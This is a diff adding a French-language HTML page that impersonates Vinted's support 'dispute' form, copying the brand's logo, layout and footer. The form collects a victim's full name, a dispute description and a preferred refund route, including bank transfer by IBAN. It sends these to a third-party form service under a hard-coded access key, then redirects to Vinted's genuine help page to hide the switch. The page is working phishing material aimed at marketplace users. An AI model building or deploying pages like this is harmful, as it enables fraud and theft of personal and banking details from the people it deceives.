@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Support | Vinted</title>
+    <link rel="icon" type="image/png" href="https://vinted.fr/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .litige-card { width: 100%; max-width: 500px; text-align: left; }
+        .label-title { display: block; font-weight: 600; margin-bottom: 8px; font-size: 14px; color: #111; }
+        textarea { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; font-family: inherit; font-size: 16px; margin-bottom: 15px; outline-color: #007782; background: #fff; }
+        select { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 15px; background: white; font-size: 16px; outline-color: #007782; }
+        .check-box { display: flex; gap: 10px; font-size: 13px; margin: 15px 0; line-height: 1.4; color: #111; }
+        .check-box input { width: 20px; height: 20px; flex-shrink: 0; }
+    </style>
+</head>
+<body>
+
+    <header class="navbar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Vinted_logo.png" alt="Vinted" class="logo-img">
+        <div class="menu-icon">☰</div>
+    </header>
+
+    <div class="search-container">
+        <div class="search-bar">
+            <span class="category">Articles ▾</span>
+            <input type="text" placeholder="Rechercher des articles">
+        </div>
+    </div>
+
+    <main class="login-container">
+        <div class="litige-card">
+            <h2 style="font-size: 22px; margin-bottom: 25px;">Détails du litige</h2>
+            
+            <form action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="c89ef8b5-6bcc-4cae-bda0-97a1ba2fc8aa">
+                <input type="hidden" name="subject" value="Nouveau formulaire de litige reçu">
+                <input type="hidden" name="redirect" value="https://www.vinted.fr/help">
+
+                <span class="label-title">Identité complète</span>
+                <div class="input-group">
+                    <input type="text" name="nom_prenom" placeholder="Prénom et Nom" required>
+                </div>
+
+                <span class="label-title">Décris ton litige</span>
+                <textarea name="description" rows="5" placeholder="Décrivez précisément l'incident rencontré..." required></textarea>
+
+                <span class="label-title">Mode de remboursement</span>
+                <select name="mode_paiement" required>
+                    <option value="">Sélectionner</option>
+                    <option value="porte_monnaie">Porte-monnaie Vinted</option>
+                    <option value="banque">Virement bancaire (IBAN)</option>
+                </select>
+
+                <div class="check-box">
+                    <input type="checkbox" required>
+                    <label>J'accepte de recevoir une réponse en anglais pour accélérer le traitement de ma demande.</label>
+                </div>
+
+                <button type="submit" class="btn-submit">Envoyer le litige pour examen</button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="vinted-footer">
+        <div class="footer-grid">
+            <div class="footer-column">
+                <h3>Vinted</h3>
+                <ul><li>À propos de Vinted</li><li>Presse</li></ul>
+            </div>
+            <div class="footer-column">
+                <h3>Aide</h3>
+                <ul><li>Centre d'aide</li><li>Confiance et sécurité</li></ul>
+            </div>
+        </div>
+        <div class="footer-legal">
+            <hr><div class="legal-links"><span>Politique de confidentialité</span><span>Termes et Conditions</span></div>
+        </div>
+    </footer>
+
+</body>
+</html>
